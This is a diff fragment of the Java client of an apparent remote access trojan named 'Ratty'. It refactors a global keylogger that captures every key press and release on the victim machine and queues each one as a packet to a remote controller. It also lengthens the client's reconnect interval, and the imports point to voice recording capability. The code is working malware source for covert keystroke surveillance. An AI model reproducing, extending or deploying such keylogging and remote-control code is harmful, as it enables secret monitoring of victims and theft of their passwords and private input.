@@ -40,7 +40,7 @@ import de.sogomn.rat.packet.VoicePacket;
 import de.sogomn.rat.util.Constants;
 import de.sogomn.rat.util.VoiceRecorder;
 
-public final class RattyClient implements IConnectionObserver, IGuiController {
+public final class RattyClient implements IConnectionObserver, IGuiController, NativeKeyListener {
 	
 	private ActiveConnection connection;
 	
@@ -48,34 +48,12 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 	private NativeKeyListener keylogger;
 	
 	private static final int VOICE_BUFFER_SIZE = 1024 << 8;
-	private static final int CONNECTION_INTERVAL = 5000;
+	private static final int CONNECTION_INTERVAL = 7500;
 	
 	public RattyClient(final ActiveConnection connection) {
 		this.connection = connection;
 		
 		chat = new ChatSwingGui();
-		keylogger = new NativeKeyListener() {
-			@Override
-			public void nativeKeyPressed(final NativeKeyEvent n) {
-				final int keyCode = n.getKeyCode();
-				final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.PRESSED);
-				
-				connection.addPacket(packet);
-			}
-			
-			@Override
-			public void nativeKeyReleased(final NativeKeyEvent n) {
-				final int keyCode = n.getKeyCode();
-				final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.RELEASED);
-				
-				connection.addPacket(packet);
-			}
-			
-			@Override
-			public void nativeKeyTyped(final NativeKeyEvent n) {
-				//...
-			}
-		};
 		
 		final List<BufferedImage> iconList = Arrays.asList(ImageUtils.EMPTY_IMAGE);
 		
@@ -147,6 +125,27 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 			
 			connection.addPacket(packet);
 		}
+	}
+	
+	@Override
+	public void nativeKeyPressed(final NativeKeyEvent n) {
+		final int keyCode = n.getKeyCode();
+		final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.PRESSED);
+		
+		connection.addPacket(packet);
+	}
+	
+	@Override
+	public void nativeKeyReleased(final NativeKeyEvent n) {
+		final int keyCode = n.getKeyCode();
+		final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.RELEASED);
+		
+		connection.addPacket(packet);
+	}
+	
+	@Override
+	public void nativeKeyTyped(final NativeKeyEvent n) {
+		//...
 	}
 	
 	/*
